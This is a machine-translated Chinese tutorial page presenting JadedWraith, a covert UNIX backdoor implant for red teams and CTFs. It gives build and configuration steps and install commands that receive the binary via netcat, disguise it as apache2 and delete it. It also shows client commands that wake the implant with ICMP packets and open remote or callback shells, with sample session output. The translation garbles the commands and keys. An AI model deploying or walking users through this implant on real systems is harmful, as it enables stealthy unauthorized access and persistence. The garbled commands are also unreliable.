# JadedWraith:轻量级 UNIX 后门

> 原文：<https://kalilinuxtutorials.com/jadedwraith/>

[![](img/4817cef65809dc88af2d4a3f7f1d2b19.png)](https://1.bp.blogspot.com/-tk7TDPJebwI/YVHYVQZsnRI/AAAAAAAAK-Y/p-WZ73KHWa894jnDmjlmDLTcck6SHkgawCLcBGAsYHQ/s687/backdoor%2B%25281%2529.png)

JadedWraith 是一个轻量级的 UNIX 后门程序，用于道德黑客攻击。对红队交战和 CTF 有用。这是我几年前写的，是我和一个朋友玩的一个游戏的一部分，这个游戏试图在不被发现或对我们的工具进行反向工程/签名的情况下，在彼此的实验室中后门尽可能多的虚拟机。

**特色**

JadedWraith 是一个强大的后门程序，能够监听 TCP 端口或嗅探“神奇”ICMP 数据包，指示后门程序进行回调或监听。这在一定程度上受到了 PRISM 等工具的启发，然而，与 PRISM JadedWraith 不同的是，它采用了劣质的加密技术来混淆命令和控制。JadedWraith 可用于执行远程命令或上传后续有效载荷。

JadedWraith 可以编译为独立的可执行文件，也可以编译为用于进程注入的共享对象。

**组件**

实际植入的源代码可以在`**src**`目录中找到。`**client**`包含一个简单的基于 python 的客户端，用于与 JadedWraith 交互。`**conf_jawr**`脚本用于配置新的 JadedWraith 可执行文件。

**依赖关系**

植入需要一个现代的 C 库和 libpthread。根据目标操作系统的不同，可能需要 libpcap(在这种情况下，您必须运行带有`**--use-libpcap**`的`**./configure**`脚本来启用 libpcap 支持)。

Python 配置脚本和客户端需要以下包才能工作:termcolor、pycryptodomex

**如何编译**

只需使用`**Makefile**`进行编译。注意:在使用之前，必须配置在`**bin**`中找到的结果二进制文件。

**$。/configure
$ make
$ ls-lart bin
-rwxrwxr-x . 1 root root 19712 年 7 月 31 日 13:08 JadedWraith-2 . 0 . 0-Linux-x86 _ 64 . elf**

**如何** C **配置**

使用`**conf_jawr**`脚本来配置 JadedWraith 可执行文件。它将在`**bin**`目录中搜索 JadedWraith 可执行文件以进行配置。配置的二进制文件将被写入`**configured**`目录。

**$。/conf_jawr
JadedWraith 配置
请选择一个 JadedWraith 二进制文件来使用:
1。JadedWraith-2 . 0 . 0-Linux-x86 _ 64 . elf
二进制:1
共享密钥[95454 c93 c8 D5 d30 a 0782 da 72 ade 10 e 29]:
启用被动模式(ICMP 唤醒)？[y/n] y
唤醒密码[4 zw 2 ttaikbcyeolwd 7 rrtasrluf 90 vsznlfzn 2 a 4 ab 018 VJ]:
argv[0](留空不欺骗命令)[] :
JadedWraith 可执行文件:/tmp/JadedWraith/configured/builds/JadedWraith-2 . 0 . 0-Linux-x86 _ 64.1627752415 . bin
试试我！
须藤。/wraith-client . py-k 95454 c 93 c8 d 5d 30 a 0782 da 72 ade 10 e 29-P 4 zw 2 ttaikbcyeolwd 7 rrtasrluf 90 vsznlfzn 2 a 4 ab 018 VJ shell**

**如何安装**

可以简单地在目标系统上运行配置好的植入程序。如果配置为使用被动 ICMP 功能，则必须以 root 用户身份运行。环境变量 _CMD 可以用来欺骗进程的`**argv[]**`

**# CD/tmp
# NC-lvp 4444>Apache 2
# chmod+x Apache 2
# _ CMD = "/usr/sbin/Apache 2"。/apache2
#rm apache2**

**如何互动**

`**client**`里面的`**wraith-client.py**`脚本可以用来和 JadedWraith 交互。只需用`**conf_jawr**`脚本产生的参数调用它，用目标的 IP 替换`**<IP_ADDRESS>**`。如果利用 ICMP 功能，则必须以 root 用户身份运行脚本来发送 ICMP 数据包。

**~/JadedWraithFork/client>sudo。/wraith-client . py 192 . 168 . 100 . 224-k 1 deeb 4 a 64440 b 8d 13 c 84 a 8 EB 4 e 7c 4453-P y 00 nrnwpwxdvpoxss 6k 0 r 7 lelfecbvkx 91 OJ 0 S5 brnlyx 1 wr shell
[+]发送 ICMP 唤醒命令到 192.168.100.224
[ *]后门将监听端口 58290 [.
[ *]进入交互外壳。cd /tmp w 14:22:49 up 3:02，1 用户，负载平均:0.18，0.19，0.23 用户 TTY 登录@ IDLE JCPU PCPU 什么 ps -ef UID PID PPID C STIME TTY 时间 CMD root 1 0 0 11:20？00:00:01/usr/lib/systemd/systemd–switched-root–system–deserialize 31。从 sudo 出口出去。/wraith-client . py 127 . 0 . 0 . 1–callback 192 . 168 . 100 . 224-k 1 dee B4 a 64440 b 8d 13 c 84 a 8 e B4 e 7c 4453-P y 00 nrnwpwxdvposss 6k 0 r 7 lelfecbvkx 91 OJ 0s 5 brnlyx 1 wr shell[+]发送 ICMP 唤醒命令到 127.0.0.1 [* ]后门将连接到端口 37943【中【*】进入交互外壳**

[**Download**](https://github.com/phath0m/JadedWraith)